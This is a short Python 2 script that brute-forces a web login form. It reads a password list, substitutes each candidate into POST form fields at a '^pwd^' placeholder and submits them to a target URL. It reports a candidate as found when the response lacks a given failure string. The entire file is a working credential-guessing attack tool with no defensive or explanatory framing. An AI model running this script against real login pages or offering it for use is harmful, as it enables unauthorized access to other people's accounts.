import requests
import hashlib
import re

from argparse import ArgumentParser, ArgumentTypeError


def args():
	args = ArgumentParser()
	args.add_argument('-pwd', help='password list')
	args.add_argument('-url', help='password list')
	args.add_argument('-data', help='name:value&password=^pwd^')
	args.add_argument('-w', help='opposite response')
	return args.parse_args()


pwdfile = pswlines = open(args().pwd.strip("' "), "r").readlines();
url = args().url
dataParam = args().data
wResponse = args().w

def pAramms(dynPassword):
	param={}
	for xsAndUrl in dataParam.split('&'):
		daddt = xsAndUrl.split('=')
		if(daddt[1] == '^pwd^'):
			param.update({daddt[0]: dynPassword})
		else:
			param.update({daddt[0]: daddt[1]})
	return param

rq = requests.session()
for psw in pwdfile:
	out = rq.post(url = url, data = pAramms(psw.strip('\n')))
	if(wResponse not in out.text):
		print pAramms(psw)
	else:
		print "[ATTEMPT] -target "+url+" -key "+psw.strip('\n')
